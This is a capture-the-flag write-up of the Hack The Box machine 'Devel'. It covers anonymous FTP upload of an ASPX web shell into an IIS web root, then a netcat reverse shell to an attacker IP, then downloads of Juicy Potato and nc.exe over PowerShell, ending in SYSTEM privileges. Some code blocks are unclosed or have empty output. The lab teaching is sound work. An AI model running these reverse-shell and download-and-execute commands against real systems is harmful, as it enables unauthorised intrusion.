## Initial Thoughts Based on Nmap Scans

Looking at the initial Nmap TCP scan, we only see two ports open: `21 FTP and 80 HTTP`. Something interesting that I noticed is that firstly, there is Anonymous FTP open so looking into that is going to be interesting, and secondly, the files that seem to be in the FTP share are two files and a directory that make me raise an eyebrow: `aspnet_client, iisstart.html,` and `welcome.png`.  The reason why this is interesting is because taking a quick peak at `HTTP`, it is hosting a `Microsoft IIS httpd 7.5` service. `IIS` stands for Internet Information Services. "Internet Information Services (IIS) for Windows® Server is a flexible, secure and manageable Web server for hosting anything on the Web. From media streaming to web applications, IIS's scalable and open architecture is ready to handle the most demanding tasks"[(Microsoft)](https://www.iis.net/). So IIS is just web server for Windows Server, and if we look at the FTP share that the Nmap scan shows, we see `iis`start.html, `aspnet_client` and a `welcome.png`. Doing a quick Google search of `iisstart.html` we can see that this is a file that is on an IIS web server. So we can say with a lot of certainty that this FTP share is being hosted within a directory that this IIS web server is being hosted. This can be exploited by having a web shell be put into the FTP server if we are able to use the FTP `PUT` command and then navigate to the web shell. With all this in mind, let's see if this can work!

## FTP - 21 | Enumeration

First thing I am going to do when enumerating FTP is see what is in this FTP share using an anonymous user since Anonymous FTP login is allowed. We can do that by simply typing in the following:

```
ftp 10.10.10.5
```

```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:bri5ee): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

All we need to do is type in `ftp $ip_addr`, use `anonymous` as the username and `a blank password` will work. Now we are in the FTP share. Typing in `dir` within FTP will show the contents within the current FTP share we are in.

```
ftp> dir
```

```
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

We see the two files and the directory we saw from the Nmap scan. Let's see if we can `GET/PUT` file into this FTP share. To do that, we use the `PUT/GET` commands within this FTP instance and see if we can `GET` files and put it onto our hosts, or `PUT` files into the FTP share. I'll start with a `GET` command to see if I can grab the file and put it onto my host. The `GET` command will grab the file and put it in the directory that I was in when I ran the `ftp` command to connect to the FTP server.

```
ftp> get welcome.png
```

```
ftp> get welcome.png
local: welcome.png remote: welcome.png
200 PORT command successful.
150 Opening ASCII mode data connection.
WARNING! 820 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
184946 bytes received in 0.58 secs (309.6074 kB/s)
```

If I look in the directory I was in, sure enough, there is the `welcome.png` we just grabbed.

```
┌──(root@kali)-[~/htb/devel]
└─# ls
exploits  gobuster  nmap  welcome.png
```

So now let's make a simple file using `touch` to just make a blank file and name is `test` in the same directory.

```
touch test
```

Now within the FTP instance we have open where we are connected to the FTP share, we can type `put` and then the file name. For me, this was just a file named `test`. So the command will be:

```
put test
```

```
local: test remote: test
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

If we run a `dir` command against the FTP share we are in again, we will see that the `test` file is in there.

```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-28-21  07:18AM                    0 test
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Great! We can `PUT/GET` files onto this FTP share. I went ahead and grabbed some of the files that were in here after this just to see if there was anything interesting in there and there wasn't much. Let's go ahead and move onto enumerating HTTP and verifying if these files are in the directory that this web server is hosting.

## HTTP - 80 | Enumeration

Navigating to `http://10.10.10.5` shows the following:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/devel/image-20210527211814214.png" />
</p>

Nothing too interesting here. It is just a default IIS7 page. Since we did see that there is a `welcome.png` file in the FTP share, this picture we see here has to be the `welcome.png` file. We can see if this is true by `right-clicking` on the picture and clicking `View Image`. Doing that, we can see that the URL is `http://10.10.10.5/welcome.png`. Just as we expected! Let's see if the `iisstart.htm` file is there as well by navigating to `http://10.10.10.5/iisstart.htm`. It is indeed there as well but just shows the `welcome.png ` picture again. I'm going to go ahead and run a `gobuster` directory brute forcer scan just to have something running in the background while I do some manual testing to see if I can get a web shell by putting the file in the FTP share and navigating to it on the web server.

```
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .htm,.txt,.asp -o gobuster/gobuster-scan
```

With that running let's see if we can get a web shell on this IIS web server.

## Initial Foothold -> Web shell on IIS Web Server Through FTP Share

To put a web shell on the IIS web server, I'm going to be using a web shell found in the [SecLists](https://github.com/danielmiessler/SecLists) GitHub repo. This is an amazing repo that has a lot of lists such as usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. I am going to clone this onto my box in the `/opt` directory using the `git clone ` command.

```
git clone https://github.com/danielmiessler/SecLists.git
```

I'm going to change directories to get into the directory of web shells. 

```
cd SecLists/Web-Shells/FuzzDB 
```

```
┌──(root@kali)-[/opt]
└─# cd SecLists/Web-Shells/FuzzDB 

┌──(root@kali)-[/opt/SecLists/Web-Shells/FuzzDB]
└─# ls
cmd.aspx  cmd.jsp  cmd.php  cmd.sh  cmd-simple.php  list.jsp  list.php  list.sh  nc.exe  reverse.jsp  up.php  up.sh
```

Looking in here we have tons of web shells, all of which have different file extensions for different use cases. For us, we are going to use the `cmd.aspx` file. The reason for this is that is because IIS runs off of ASP.NET (Active Server Page) which is an open-source, server-side web-application framework designed for web development to produce dynamic web pages. Knowing this, we can use the `cmd.aspx` web shell to ensure it properly works with the IIS web server.  From here, let's go ahead and connect to the FTP server again and put the `cmd.aspx` file into the FTP share.

```

226 Transfer complete.
ftp> exit
221 Goodbye.
```

With the file there, let's try to navigate to it by going to `http://10.10.10.5/cmd.aspx`. 

<p align="center">
  <img src="{{ site.github.url }}/images/htb/devel/image-20210527213741844.png" />
</p>


And we have our nifty little web shell. We can see if it properly functions by trying to ping ourselves and running a `tcpdump` which will capture packets coming from our VPN network interface.

<p align="center">
  <img src="{{ site.github.url }}/images/htb/devel/image-20210527213849690.png" />
</p>


Here you would want to put your own IP whatever that may be. Then we are going to run the following command to make sure we are capturing only pings from our `tun0` (HTB VPN) network interface.

```
tcpdump -i tun0 icmp
```

With that running, we can go ahead and hit `execute` and see if we get pings back.

```
┌──(root@kali)-[/opt/SecLists/Web-Shells/FuzzDB]

```

And we see that we do get pings back. Great! Now the question is how do we get an actual shell on the box from this? Well since we know this is a Windows box, we can do something interesting which is setting up our own SMB server. If you do not know what SMB is, SMB is essentially a protocol that allows applications and services on networked computers to communicate with each other. SMB allows for core features such as printing, file sharing, device sharing, etc.  Knowing that is has the feature to file share, that is exactly what we are going to use it for when go from web shell to a shell on the host.

## Web Shell -> Shell on the Host

To go ahead and host our SMB server are we going to use `smbserver.py`. `smbserver.py` takes two arguments: `<share_name>` and `<path_of_dir_you_want_to_share>`. For us, we want to have within our SMB server a `Netcat` binary so that we can get a reverse shell. Thankfully, Kali Linux comes with windows-binaries on the system already within the directory `/usr/share/windows-binaries/`. So we can get this share going by running the following command:

```
smbserver.py share /usr/share/windows-binaries/
```

```

Now all we need to do is have the web shell grab this Netcat binary. But something else we need to do is also have this execute commands. Netcat has the `-e` flag which will allow us to execute a program on connection. The program we are going to execute is `cmd.exe` and then we can specify an IP address and a port that we want it to connect to, that being our own IP and a port we are listening on. So let's go ahead and set our Netcat listener up and then execute the command within our web shell to get a shell on the host.

```
nc -lvnp 4444
```

```
\\10.10.14.36\share\nc.exe -e cmd.exe 10.10.14.36 4444

And we get a shell! Running a `whoami` command shows us we are a low-privileged user.

```
c:\windows\system32\inetsrv>whoami
whoami

```

Since we got a shell off of a web server, something I like doing is running `whoami /priv` to see what is on this account. If you ever get code execution and get a shell on a service account, running `whoami /priv` is a great thing to do because service accounts tend to have something interesting which is what you'll see below.

```
whoami /priv
```

```
c:\windows\system32\inetsrv>whoami /priv

```

Something that catches my eye is `SeImpersonatePrivilege` which allows a user account to impersonate another user for a brief period of time. We're going to want to impersonate the `SYSTEM` user so we can have full permissions. We can do this with an exploit called Juicy Potato. On our Kali Linux box, let's go ahead and download the Juicy Potato exploit, send it over to our box along with a Netcat binary on the host, and then see if we can exploit the box this way.

## Getting SYSTEM through Juicy Potato

Firstly on the shell we have on the Windows host, I quickly change directories to `C:\Windows\Temp` and use the `echo test.txt > test.txt` command to make sure I am able to write files in this directory. The reason for this is sometimes you may attempt to download a file and you won't be able to. This is because you most likely do not have permissions to write a file in that directory so I make sure I can do that before I download any files.

```
c:\Windows\Temp>echo test.txt > test.txt
echo test.txt > test.txt

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

From here, I went ahead and downloaded a 32-bit version of Juicy Potato since this box is using 32-bit architecture. This can be found using the `systeminfo` command.

We can see that the `System Type` is `X86-Based`. So we know it is 32-bit. We can download a 32-bit version of Juicy Potato [here](https://github.com/ivanitlearning/Juicy-Potato-x86/releases). I go ahead and download it and copy the `nc.exe` binary from `/usr/share/windows-binaries/nc.exe` into a directory I have called `/devel/exploits`. To download these files onto the Windows host, we can set up an HTTP server that will be hosting the directory we are currently in when we run it. The command to setup an HTTP  server on our current directory is:

```
python -m SimpleHTTPServer 80
```

This will setup an HTTP server on port 80. Now we can go and download the file from the Windows host with the following commands:

```
c:\Windows\Temp>powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.36/JuicyPotatox86.exe', 'JuicyPotato.exe')
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.36/JuicyPotato.exe', 'JuicyPotatox86.exe')


c:\Windows\Temp>powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.36/nc.exe', 'nc.exe')               
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.36/nc.exe', 'nc.exe')

```

Now that we have the files we need, we can go ahead and set up a Netcat listener. We are going to use `rlwrap` with Netcat. `rlwrap` is a 'readline wrapper', a small utility that uses the [GNU Readline](https://tiswww.case.edu/php/chet/readline/rltop.html) library to allow the editing of keyboard input for any command.

```
rlwrap nc -lvnp 9001
```

Juicy Potato takes a handful of arguments to run correctly. If you want to read more into it, please look into the GitHub repo [here](https://github.com/ohpe/juicy-potato) where a good amount of documentation is done on the exploit. Something I do want to note though is the `-c` option. `-c` is specifying a certain `CLSID` which is a software applications class ID or "class identifier". We essentially are impersonating a service by supplying a `CLSID` of a service that is running with higher privileges than us, that being `SYSTEM`. A list of `CLSIDs` can be found [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID). Personally for me, I had to go through a few `CLSIDs` that are running as `NT AUTHORITY\SYSTEM` to get it to work but the one that did work is `{03ca98d6-ff5d-49b8-abc6-03dd84127020}` so I went ahead and ran with that. 

```
c:\Windows\Temp>.\Juicy.Potato.x86.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.36 9001" -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"                   
```

Checking back on the Netcat listener we successfully got a shell back and we are indeed `NT AUTHORITY\SYSTEM`! 

```
$ rlwrap nc -lvnp 9001
